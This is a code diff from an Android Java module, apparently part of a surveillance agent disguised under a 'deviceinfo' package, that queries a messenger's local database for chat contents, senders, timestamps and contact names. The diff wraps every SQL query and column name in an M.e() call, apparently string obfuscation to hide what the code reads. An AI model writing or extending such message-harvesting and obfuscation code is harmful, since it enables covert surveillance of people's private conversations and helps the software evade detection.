@@ -16,6 +16,7 @@ import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class ChatLine extends SubModuleChat {
 	private static final String TAG = "ChatLine";
@@ -165,9 +166,9 @@ public class ChatLine extends SubModuleChat {
 			// helper.deleteAtEnd = false;
 			final ChatGroups groups = getLineGroups(helper);
 
-			String sqlquery = "select chat_id, from_mid, content, ch.created_time, sent_count , name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where type=1 and ch.created_time > ? order by ch.created_time ";
-			String[] projection = new String[] { "chat_id", "from_mid", "content", "ch.created_time", "sent_count",
-					"name" };
+			String sqlquery = M.e("select chat_id, from_mid, content, ch.created_time, sent_count , name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where type=1 and ch.created_time > ? order by ch.created_time ");
+			String[] projection = new String[] { M.e("chat_id"), M.e("from_mid"), M.e("content"), M.e("ch.created_time"), M.e("sent_count"),
+					M.e("name") };
 
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
@@ -266,13 +267,13 @@ public class ChatLine extends SubModuleChat {
 			}
 		};
 
-		String sqlquery = "SELECT  chat_id, mid, name FROM 'chat_member' left join contacts on chat_member.mid = contacts.m_id";
+		String sqlquery = M.e("SELECT  chat_id, mid, name FROM 'chat_member' left join contacts on chat_member.mid = contacts.m_id");
 		helper.traverseRawQuery(sqlquery, null, visitor);
 
-		sqlquery = "select chat_id, owner_mid, name from chat as ch left join contacts as c on ch.owner_mid = c.m_id";
+		sqlquery = M.e("select chat_id, owner_mid, name from chat as ch left join contacts as c on ch.owner_mid = c.m_id");
 		helper.traverseRawQuery(sqlquery, null, visitor);
 
-		sqlquery = "select distinct chat_id, from_mid, name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where from_mid not null";
+		sqlquery = M.e("select distinct chat_id, from_mid, name from chat_history as ch left join contacts as c on ch.from_mid = c.m_id where from_mid not null");
 		helper.traverseRawQuery(sqlquery, null, visitor);
 
 		groups.addLocalToAllGroups(account);
